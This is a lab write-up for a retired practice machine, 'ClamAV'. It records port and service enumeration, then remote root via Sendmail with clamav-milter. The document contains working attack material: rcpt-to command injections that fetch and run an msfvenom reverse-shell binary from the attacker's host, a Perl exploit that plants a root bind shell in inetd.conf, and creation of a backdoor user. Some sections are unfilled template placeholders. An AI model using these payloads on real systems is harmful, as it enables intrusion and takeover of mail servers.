# ClamAV
## Table of Contents
* [Summary](#summary)
* [Enumerate](#enumerate)
  * [Ports](#ports)
  * [Services](#services)
    * [SSH](#ssh) 
    * [SMTP](#smtp)
    * [HTTP](#http)
    * [RPC](#rpc)
  * [OS](#os)
    * [Nmap OS Discovery Scan](#nmap-os-discovery-scan)
    * [Nmap OS Discovery Scan via SMB](#nmap-os-discovery-scan-via-smb)
    * [Nmap Scripts Scan](#nmap-scripts-scan)
    * [Nmap Aggressive Scan](#nmap-aggressive-scan)
* [Exploit](#exploit)
  * [Password Guessing](#password-guessing) 
    * [Default Credentials](#default-credentials)
    * [Hydra](#hydra)
    * [Patator](#patator)
  * [CVE-2021-1234](#cve-2021-1234) 
    * [EDB-ID-56789](#edb-id-56789)
    * [cyberphor POC](#cyberphor-poc)
    * [Metasploit](#metasploit)
* [Explore](#explore)
* [Escalate](#escalate)
* [Lessons Learned](#lessons-learned)
* [Walkthrough](#walkthrough)

## Summary
* Hostname: 0XBABE
* Description: Retired exam machine to help you prepare.
* IP Address: 192.168.108.42
* MAC Address: 00:00:00:00:00:00 (ref: nbtscan)
* Domain: WORKGROUP
* TCP Ports and Services
  * 22
    * SSH
  * 25
    * SMTP
  * 80
    * HTTP
  * 139
    * NetBIOS
  * 199
    * smux
  * 445
    * Samba
  * 6000
    * SSH
* OS 
  * Distro: (ref:)
  * Kernel: Linux 0xbabe.local 2.6.8-4-386 #1 Wed Feb 20 06:15:54 UTC 2008 i686 GNU/Linux (ref: uname via PE)
  * Architecture: x86 (ref: uname via PE)
* Users 
  * root:password123 (ref:)
  * root (ref: nmap smtp-enum-users script)
  * admin (ref: nmap smtp-enum-users script)
  * administrator (ref: nmap smtp-enum-users script)
  * webadmin (ref: nmap smtp-enum-users script)
  * sysadmin (ref: nmap smtp-enum-users script)
  * netadmin (ref: nmap smtp-enum-users script)
  * guest (ref: nmap smtp-enum-users script)
  * user (ref: nmap smtp-enum-users script)
  * web (ref: nmap smtp-enum-users script)
  * test (ref: nmap smtp-enum-users script)
* Vulnerabilities and Exploits
  * Sendmail 8.13
  * Current configuration allows an attacker to send email to local users via the following commands: mail from, rcpt to. 
  * An attacker can use this vulnerability to perform Remote Code Execution (wget, chmod, ./rshell.elf). 

# Enumerate
## Setup
```bash
TARGET=192.168.108.42
NAME=clamav
new-ctf $NAME
cd $NAME
```

## Ports
```bash
sudo nmap $TARGET -sS -sU --min-rate 1000 -oN scans/$NAME-nmap-initial
sudo nmap $TARGET -sS -sU -p- --min-rate 1000 -oN scans/$NAME-nmap-complete
sudo nmap $TARGET -sV $(print-open-ports-from-nmap-scan scans/$NAME-nmap-complete) -oN scans/$NAME-nmap-versions

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-07 08:33 EDT
Nmap scan report for 192.168.108.42
Host is up (0.075s latency).

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
25/tcp    open  smtp        Sendmail 8.13.4/8.13.4/Debian-3sarge3
80/tcp    open  http        Apache httpd 1.3.33 ((Debian GNU/Linux))
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
199/tcp   open  smux        Linux SNMP multiplexer
445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
60000/tcp open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
Service Info: Host: localhost.localdomain; OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.41 seconds
```

## Services
### SSH
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt  ssh://$TARGET

# output
NSTR
```

### SMTP
Automated enumeration of supported SMTP commands.
```bash
sudo nmap $TARGET -p25 --script smtp-commands -oN scans/$NAME-nmap-script-smtp-commands

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-07 09:44 EDT
Nmap scan report for 192.168.108.42
Host is up (0.073s latency).

PORT   STATE SERVICE
25/tcp open  smtp
| smtp-commands: localhost.localdomain Hello [192.168.49.108], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP, 
|_ 2.0.0 This is sendmail version 8.13.4 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info 

Nmap done: 1 IP address (1 host up) scanned in 0.89 seconds
```

Automated enumeration of existing SMTP users.
```bash
sudo nmap $TARGET -p25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} -oN scans/$NAME-nmap-script-smtp-enum-users

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-07 09:45 EDT
Failed to resolve "smtp-enum-users.methods=EXPN".
Failed to resolve "smtp-enum-users.methods=RCPT".
Failed to resolve "smtp-enum-users.methods=RCPT".
Nmap scan report for 192.168.108.42
Host is up (0.079s latency).

PORT   STATE SERVICE
25/tcp open  smtp
| smtp-enum-users: 
|   root
|   admin
|   administrator
|   webadmin
|   sysadmin
|   netadmin
|   guest
|   user
|   web
|_  test

Failed to resolve "smtp-enum-users.methods=RCPT".
Nmap done: 1 IP address (1 host up) scanned in 1.90 seconds
```

Automated enumeration of exploitable SMTP vulnerabilities.
```bash
sudo nmap $TARGET -p25 --script smtp-vuln* -oN scans/mailman-nmap-script-smtp-vuln

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-07 09:48 EDT
Nmap scan report for 192.168.108.42
Host is up (0.075s latency).

PORT   STATE SERVICE
25/tcp open  smtp
| smtp-vuln-cve2010-4344: 
|_  The SMTP server is not Exim: NOT VULNERABLE

Nmap done: 1 IP address (1 host up) scanned in 0.81 seconds
```

### HTTP
The target is not vulnerable to Shellshock.
```bash
sudo nmap $TARGET -p80 --script http-shellshock -oN scans/$NAME-nmap-scripts-http-shellshock-80

# output
NSTR
```

```bash
dirb http://$TARGET:80 -w /usr/share/wordlists/dirb/big.txt -z10 -o scans/$NAME-dirb-big-80

# output
---- Scanning URL: http://192.168.108.42/ ----
+ http://192.168.108.42/cgi-bin/ (CODE:403|SIZE:277)                                                                                  
+ http://192.168.108.42/doc (CODE:403|SIZE:272)                                                                                       
+ http://192.168.108.42/index (CODE:200|SIZE:289)                                                                                     
+ http://192.168.108.42/index.html (CODE:200|SIZE:289)
```

```bash
dirsearch -u $TARGET:$PORT -o $FULLPATH/$NAME-dirsearch-80 --format=simple

# output
[09:11:52] 200 -  289B  - /index.html                                                                                      
[09:11:52] 200 -  289B  - /index
```

```bash
nikto -h $TARGET -p $PORT -T 2 -Format txt -o scans/$NAME-nikto-misconfig-80

# output
NSTR
```

### NetBIOS
```bash
nbtscan $TARGET

# output
Doing NBT name scan for addresses from 192.168.108.42

IP address       NetBIOS Name     Server    User             MAC address      
------------------------------------------------------------------------------
192.168.108.42   0XBABE           <server>  0XBABE           00:00:00:00:00:00
```

### SMB
```bash
smbclient -L $TARGET

# output
Enter WORKGROUP\victor's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (0xbabe server (Samba 3.0.14a-Debian) brave pig)
        ADMIN$          IPC       IPC Service (0xbabe server (Samba 3.0.14a-Debian) brave pig)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------
        0XBABE               0xbabe server (Samba 3.0.14a-Debian) brave pig

        Workgroup            Master
        ---------            -------
        WORKGROUP            0XBABE
```
```bash
smbmap -H $TARGET

# output
[+] Guest session       IP: 192.168.108.42:445  Name: 192.168.108.42                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        IPC$                                                    NO ACCESS       IPC Service (0xbabe server (Samba 3.0.14a-Debian) brave pig)
        ADMIN$                                                  NO ACCESS       IPC Service (0xbabe server (Samba 3.0.14a-Debian) brave pig)
```

## OS
```bash
sudo nmap $TARGET -sC -oN scans/$NAME-nmap-scripts

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-07 09:14 EDT
Nmap scan report for 192.168.108.42
Host is up (0.084s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
| ssh-hostkey: 
|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
25/tcp  open  smtp
| smtp-commands: localhost.localdomain Hello [192.168.49.108], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP, 
|_ 2.0.0 This is sendmail version 8.13.4 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info 
80/tcp  open  http
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Ph33r
139/tcp open  netbios-ssn
199/tcp open  smux
445/tcp open  microsoft-ds

Host script results:
|_clock-skew: mean: 5h59m58s, deviation: 2h49m42s, median: 3h59m58s
|_nbstat: NetBIOS name: 0XBABE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.14a-Debian)
|   NetBIOS computer name: 
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-07-07T13:15:02-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: share (dangerous)
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Nmap done: 1 IP address (1 host up) scanned in 44.71 seconds
```

# Exploit
## Password Guessing
### Default Credentials
```bash
# CMS Web App 9000
# admin:admin
```

### Hydra
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET http-post-form "/phpmyadmin/index.php?:pma_username=^USER^&pma_password=^PASS^:Cannot|without"

# output
NSTR
```

### Patator
```bash
patator http_fuzz url=http://$TARGET/$LOGIN method=POST body='username=FILE0&password=FILE1' 0=usernames.txt 1=/usr/share/wordlists/rockyout.txt -x ignore:fgrep=Unauthorized
```

## CVE-2021-1234
### EDB-ID-56789
```bash
searchsploit foo
mkdir edb-id-56789
cd edb-id-56789
searchsploit -x 56789
```

### cyberphor POC
```bash
git clone https://github.com/cyberphor/cve-2021-1234-poc.git
cd cve-2021-56789-poc
```

### Metasploit
```bash
msfconsole
search ???
use exploit/???/???
set LHOST tun0
set RHOST $TARGET
run
```

### Sendmail
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.49.108 LPORT=443 -f elf -o rshell.elf
sudo python3 -m http.server 80

telnet 192.168.108.42 25
helo moto
mail from:<>
rcpt to:<root+"|wget http://192.168.49.108/rshell.elf"@localhost>
data
.
quit

sudo nc -nvlp 443
telnet 192.168.108.42 25
mail from:<>
rcpt to:<root+"|chmod +x rshell.elf"@localhost> 
data
.
mail from:<>
rcpt to:<root+"|./rshell.elf"@localhost>
data
.

cat /root/proof.txt
useradd victor -g root -s /bin/bash
echo "victor:password" | chpasswd 

ssh victor@192.168.108.42
# output
Unable to negotiate with 192.168.108.42 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1

ssh victor@192.168.108.42 -oKexAlgorithms=+diffie-hellman-group1-sha1
id
# output
uid=1000(victor) gid=0(root) groups=0(root)
```

# Lessons Learned
* Enumerate SMTP commands and users. If you can "mail from, rcpt to" a super-user, then you can perform RCE. 
* SMTP can be used for RCE.
* Identify what you can do and under what context. 

# Things Observed
TCP Port 80 had a page titled Ph33r containing binary code. When decoded, the message reads "if you dont pwn me u r a n00b".
```bash
firefox http://192.168.108.42

01101001 01100110 01111001 01101111 01110101 01100100 01101111 01101110 01110100 01110000 01110111 01101110 01101101 01100101 01110101 01110010 01100001 01101110 00110000 0011 0000 01100010 

ifyoudontpwnmeuran00b
```

# Walkthrough
* Tools Used
  * nmap
  * telnet
  * msfvenom
  * ping
  * tcpdump
  * wireshark
  * python3 http.server module
  * wget
  * chmod
  * nc
* Flag
  * 1d74f53021975ed2425abd317a808ea6
* Hints
  *  Carefully enumerate the SMTP service.
  * Enumerate the SNMP service. Using snmp-check can help extract info about running processes. Antivirus software should be updated.
  * Once you identify the antivirus software name and version, search for it on EDB. There is an RCE exploit for it. 

```bash
Exploitation Guide for ClamAV
Summary

This machine is exploited via a remote command execution vulnerability in Sendmail with clamav-milter.
Enumeration
Nmap

We start off by running an nmap scan against all TCP ports:

kali@kali:~$ sudo nmap -p- 192.168.120.81
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-23 09:55 EDT
Nmap scan report for 192.168.120.81
Host is up (0.032s latency).
Not shown: 65528 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
80/tcp    open  http
139/tcp   open  netbios-ssn
199/tcp   open  smux
445/tcp   open  microsoft-ds
60000/tcp open  unknown

Next, let’s run an aggressive scan against the discovered open ports:

kali@kali:~$ sudo nmap -A -sV -p 22,25,80,139,199,445,60000 192.168.120.81
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-23 10:18 EDT
Nmap scan report for 192.168.120.81
Host is up (0.031s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
25/tcp    open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
80/tcp    open  http       Apache httpd 1.3.33 ((Debian GNU/Linux))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.33 (Debian GNU/Linux)
|_http-title: Ph33r
139/tcp   open  tcpwrapped
199/tcp   open  smux       Linux SNMP multiplexer
445/tcp   open  tcpwrapped
60000/tcp open  ssh        OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: firewall|general purpose|proxy server|WAP|PBX
Running (JUST GUESSING): Linux 2.6.X (94%), Cisco embedded (94%), Riverbed embedded (94%), Ruckus embedded (94%), ZoneAlarm embedded (93%)
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/h:cisco:sa520 cpe:/h:riverbed:steelhead_200 cpe:/h:ruckus:7363 cpe:/h:zonealarm:z100g cpe:/h:cisco:uc320w cpe:/h:cisco:rv042
Aggressive OS guesses: Cisco SA520 firewall (Linux 2.6) (94%), Linux 2.6.9 - 2.6.27 (94%), Riverbed Steelhead 200 proxy server (94%), Ruckus 7363 WAP (94%), Linux 2.6.9 (94%), Linux 2.6.18 - 2.6.22 (94%), Linux 2.6.9 (CentOS 4.4) (94%), ZoneAlarm Z100G WAP (93%), Linux 2.6.18 (92%), Linux 2.6.32 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: 0XBABE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   29.05 ms 192.168.118.1
2   29.21 ms 192.168.120.81

SMTP Enumeration

Using netcat, we will try interacting with the SMTP service on port 25:

kali@kali:~$ nc -vv 192.168.120.81 25
192.168.120.81: inverse host lookup failed: Unknown host
(UNKNOWN) [192.168.120.81] 25 (smtp) open
HELO test
220 localhost.localdomain ESMTP Sendmail 8.13.4/8.13.4/Debian-3sarge3; Mon, 23 Mar 2020 14:20:48 -0400; (No UCE/UBE) logging access from: [192.168.118.3](TEMP)-[192.168.118.3]
250 localhost.localdomain Hello [192.168.118.3], pleased to meet you
quit
221 2.0.0 localhost.localdomain closing connection
 sent 15, rcvd 299
kali@kali:~$

With the help of this enumeration, we have identified the service as ESMTP Sendmail
SNMP Enumeration

Although we did not scan for the SNMP service on UDP port 161 (and UDP scans are not very reliable anyway), we will attempt to enumerate SNMP service to see if it is running on the target. We can use the snmp-check tool for this purpose:

kali@kali:~$ snmp-check 192.168.120.94
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 192.168.120.94:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : 192.168.120.94
  Hostname                      : 0xbabe.local
  Description                   : Linux 0xbabe.local 2.6.8-4-386 #1 Wed Feb 20 06:15:54 UTC 2008 i686
  Contact                       : Root <root@localhost> (configure /etc/snmp/snmpd.local.conf)
  Location                      : Unknown (configure /etc/snmp/snmpd.local.conf)
  Uptime snmp                   : 00:33:28.71
  Uptime system                 : 00:32:46.43
  System date                   : 2020-4-28 16:22:09.0

...

  3761                  runnable              klogd                 /sbin/klogd                               
  3765                  runnable              clamd                 /usr/local/sbin/clamd                      
  3767                  runnable              clamav-milter         /usr/local/sbin/clamav-milter  --black-hole-mode -l -o -q /var/run/clamav/clamav-milter.ctl
  3776                  runnable              inetd                 /usr/sbin/inetd
...

We find that SNMP service is indeed running on the target, and the output generated by this enumeration is quite large. Sifting through the output, we find clamav-milter is running with Sendmail in black-hole-mode.
Exploitation
Remote Code Execution

Looking up exploits for this combination leads us to a Remote Command Execution vulnerability.

Following the exploit, we will create the following Perl file:

kali@kali:~$ cat 4761.pl
#!/usr/bin/perl

use IO::Socket::INET;

print "Sendmail w/ clamav-milter Remote Root Exploit\n"; print "Copyright (C) 2007 Eliteboy\n";
if ($#ARGV != 0) {print "Give me a host to connect.\n";exit;} print "Attacking $ARGV[0]...\n";
$sock = IO::Socket::INET->new(PeerAddr => $ARGV[0],
                                PeerPort => '25',
                                Proto    => 'tcp');
print $sock "ehlo you\r\n";
print $sock "mail from: <>\r\n";
print $sock "rcpt to: <nobody+\"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf\"@localhost>\r\n";
print $sock "rcpt to: <nobody+\"|/etc/init.d/inetd restart\"@localhost>\r\n"; print $sock "data\r\n.\r\nquit\r\n";
  while (<$sock>) {
          print;
}

This exploit should hopefully open a bind shell on the target on TCP port 31337. Let’s give the exploit executable permissions, and then run it:

kali@kali:~$ chmod 777 4761.pl
kali@kali:~$
kali@kali:~$ ./4761.pl 192.168.120.144
Sendmail w/ clamav-milter Remote Root Exploit
Copyright (C) 2007 Eliteboy
Attacking 192.168.120.144...
220 localhost.localdomain ESMTP Sendmail 8.13.4/8.13.4/Debian-3sarge3; Mon, 3 Aug 2020 16:30:08 -0400; (No UCE/UBE) logging access from: [192.168.118.3](FAIL)-[192.168.118.3]
250-localhost.localdomain Hello [192.168.118.3], pleased to meet you
250-ENHANCEDSTATUSCODES
250-PIPELINING
250-EXPN
250-VERB
250-8BITMIME
250-SIZE
250-DSN
250-ETRN
250-DELIVERBY
250 HELP
250 2.1.0 <>... Sender ok
250 2.1.5 <nobody+"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf">... Recipient ok
250 2.1.5 <nobody+"|/etc/init.d/inetd restart">... Recipient ok
354 Enter mail, end with "." on a line by itself
250 2.0.0 073KU8jk004063 Message accepted for delivery
221 2.0.0 localhost.localdomain closing connection
kali@kali:~$

If everything worked correctly, we should now be able to connect to the target on port 31337:

kali@kali:~$ nc -nv 192.168.120.144 31337
(UNKNOWN) [192.168.120.144] 31337 (?) open
whoami
root

Escalation

As the vulnerable service was running with root privileges, no further privilege escalation is needed.
```
